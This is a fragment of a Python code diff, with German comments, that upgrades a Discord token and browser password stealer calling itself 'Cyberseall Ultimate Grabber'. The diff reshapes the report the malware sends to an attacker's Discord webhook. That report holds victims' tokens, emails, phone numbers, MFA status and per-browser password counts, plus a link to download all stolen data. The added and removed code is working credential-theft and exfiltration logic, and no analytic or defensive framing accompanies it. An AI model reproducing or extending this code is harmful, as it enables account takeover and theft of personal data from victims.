+                        "value": f"```User: {username}#{discriminator}\nEmail: {email}\nPhone: {phone}\nNitro: {has_nitro} ({nitro_days} days)\nMFA: {mfa} | Verified: {verified}\nToken: {token[:60]}...```",
+                        "inline": False
+                    })
+            
+            # Zeige Browser-Statistiken
+            if total_passwords > 0:
+                # Gruppiere Passwörter nach Browser
+                browser_stats = {}
+                for pwd_entry in self.p:
+                    browser = pwd_entry.split(" |")[0]
+                    if browser not in browser_stats:
+                        browser_stats[browser] = 0
+                    browser_stats[browser] += 1
+                
+                browser_summary = []
+                for browser, count in sorted(browser_stats.items(), key=lambda x: x[1], reverse=True)[:5]:
+                    browser_summary.append(f"{browser}: {count}")
+                
+                embed_fields.append({
+                    "name": "Browser Breakdown",
+                    "value": f"```{chr(10).join(browser_summary)}```",
+                    "inline": False
+                })
+            
+            # Download-Link
+            embed_fields.append({
+                "name": "Download All Data",
+                "value": f"[**CLICK HERE TO DOWNLOAD**]({self.link if hasattr(self, 'link') else 'Upload failed'})",
+                "inline": False
+            })
+            
             embed = {
                 "embeds": [{
-                    "title": "🔥 CYBERSEALL ULTIMATE GRABBER v4.2",
+                    "title": "CYBERSEALL ULTIMATE GRABBER v5.0",
+                    "description": "**STEALTH DATA EXTRACTION COMPLETE**",
                     "color": 0xff0000,
-                    "fields": [
-                        {
-                            "name": "💎 Results",
-                            "value": "```" + str(len(set(self.t))) + " Raw Tokens\n" + str(len(self.vt)) + " Valid Tokens\n" + str(len(self.p)) + " Browser Passwords\n" + str(len(self.f)) + " Keyword Files```"
-                        },
-                        {
-                            "name": "💻 Target",
-                            "value": "```" + getpass.getuser() + "@" + os.getenv("COMPUTERNAME", "?") + "```"
-                        },
-                        {
-                            "name": "📁 Download",
-                            "value": "[**CLICK HERE TO DOWNLOAD**](" + str(self.link if hasattr(self, 'link') else 'Failed') + ")",
-                            "inline": False
-                        }
-                    ],
-                    "footer": {"text": "Cyberseall ULTIMATE Grabber v4.2 - Optimized Token Extraction"},
+                    "fields": embed_fields,
+                    "footer": {"text": "Cyberseall ULTIMATE v5.0 - Enhanced Browser Stealer"},
                     "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                 }]
             }
             
             requests.post(self.w, json=embed, timeout=10)
             
-            # Sende alle validen Token mit Nitro-Info
-            if len(self.vt) > 0:
-                for i, token_info in enumerate(self.vt[:5]):  # Max 5 Token
-                    token_embed = {
-                        "embeds": [{
-                            "title": "✅ VALID TOKEN #" + str(i+1),
-                            "color": 0x00ff00,
-                            "fields": [
-                                {
-                                    "name": "👤 User",
-                                    "value": "```" + token_info.get('username', '?') + "#" + token_info.get('discriminator', '?') + "```"
-                                },
-                                {
-                                    "name": "📧 Email",
-                                    "value": "```" + str(token_info.get('email', 'Hidden')) + "```"
-                                },
-                                {
-                                    "name": "📱 Phone",
-                                    "value": "```" + str(token_info.get('phone', 'None')) + "```"
-                                },
-                                {
-                                    "name": "💎 Nitro",
-                                    "value": "```Has Nitro: " + str(token_info.get('has_nitro', False)) + "\nDays Left: " + str(token_info.get('nitro_days_left', 0)) + "```"
-                                },
-                                {
-                                    "name": "🔐 Token",
-                                    "value": "```" + token_info['token'][:50] + "...```"
-                                },
-                                {
-                                    "name": "🛡️ Security",
-                                    "value": "```MFA: " + str(token_info.get('mfa_enabled', False)) + "\nVerified: " + str(token_info.get('verified', False)) + "\nPremium: " + str(token_info.get('premium_type', 0)) + "```"
-                                }
-                            ],
-                            "footer": {"text": "Valid Token Info with Nitro"},
-                            "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
-                        }]
-                    }
-                    requests.post(self.w, json=token_embed, timeout=5)
         except:
             pass
 
